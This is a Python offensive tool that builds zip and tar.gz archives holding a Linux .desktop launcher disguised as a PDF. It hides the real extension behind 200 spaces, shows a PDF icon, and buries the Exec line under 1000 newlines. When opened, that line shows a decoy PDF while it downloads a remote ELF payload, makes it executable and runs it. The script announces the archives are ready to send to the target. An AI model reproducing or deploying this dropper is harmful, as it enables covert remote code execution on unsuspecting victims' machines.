#!/usr/bin/python
# .desktop file payload dropper. This script generates a .tar.gz and .zip file(s) which contain a .desktop file masquerading as a PDF. 
# Downloads and opens a remote PDF file and downloads and executes a remote ELF payload.
# Author: @0rbz_


import os,argparse

class color:
    g = '\033[92m'
    y = '\033[93m'
    b = '\033[0m'

print color.y + '''
 __ __           __
|  |__|.-----.--|  |.----.-----.-----.
|  |  ||     |  _  ||   _|  _  |  _  |
|__|__||__|__|_____||__| |_____|   __|
                               |__|
 Author: @0rbz_
''' + color.b

def ze_args():
    parser = argparse.ArgumentParser(
        description=".desktop payload dropper",
        epilog="Example: python LinDrop.py --pdf-name readme --zip-name files --payload-url http://site/payload --remote-pdf http://site/whatever.pdf")
    parser.add_argument(
        '--pdf-name', type=str, help='Name of PDF for archive', required=True)
    parser.add_argument(
        '--zip-name', type=str, help='Name of output zip file', required=True)
    parser.add_argument(
        '--payload-url', type=str, help='Remotely hosted payload', required=True)
    parser.add_argument(
        '--remote-pdf', type=str, help='Remotely hosted PDF to display to the user', required=True)

    args = parser.parse_args()

    pdf_name = args.pdf_name
    zip_name = args.zip_name
    payload_url = args.payload_url
    remote_pdf = args.remote_pdf
    return pdf_name,zip_name,payload_url,remote_pdf

pdf_name,zip_name,payload_url,remote_pdf = ze_args()


f = open(pdf_name + ".pdf" + ' '*200+ ".desktop", "a")
f.write("[Desktop Entry]" + "\n" + "Type=Application" + "\n" + "NoDisplay=False" + "\n" + "StartupNotify=true" + "\n" + "Icon=/usr/share/icons/gnome-colors-common/scalable/apps/x-pdf.svg" + "\n" + "Name[en_US]=" + pdf_name + ".pdf" + "\n" + "Terminal=false" + "\n")

f.write("\n"*1000 + """Exec=sh -c "wget 'remote_pdf' -O /tmp/temp.pdf && sh -c 'evince /tmp/temp.pdf &' && sh -c 'rm -rf /tmp/pl892' && sh -c 'wget payload_url -O /tmp/pl892' && sh -c 'chmod +x /tmp/pl892' && sh -c '/tmp/pl892'""" + '"' + "\n")

f = open(pdf_name + ".pdf" + ' '*200+ ".desktop",'r')
fdata = f.read()
f.close()
new = fdata.replace("payload_url", str(payload_url))
f = open(pdf_name + ".pdf" + ' '*200+ ".desktop",'w')
f.write(new)

f = open(pdf_name + ".pdf" + ' '*200+ ".desktop",'r')
fdata = f.read()
f.close()
new = fdata.replace("remote_pdf", str(remote_pdf))
f = open(pdf_name + ".pdf" + ' '*200+ ".desktop",'w')
f.write(new)

f.close()

os.system("chmod +x " + pdf_name +".pdf*")
os.system("tar -czf " + zip_name+".tar.gz " + pdf_name + ".pdf*")
os.system("zip " + zip_name +".zip " + pdf_name + ".pdf*" + " --quiet")
os.system("rm " + pdf_name + ".pdf*")

print color.g + "Files " + '"' + zip_name + ".zip" + '"'+ " and" + ' "' + zip_name + ".tar.gz" + '"' " have been created and ready to send to the target." + color.b

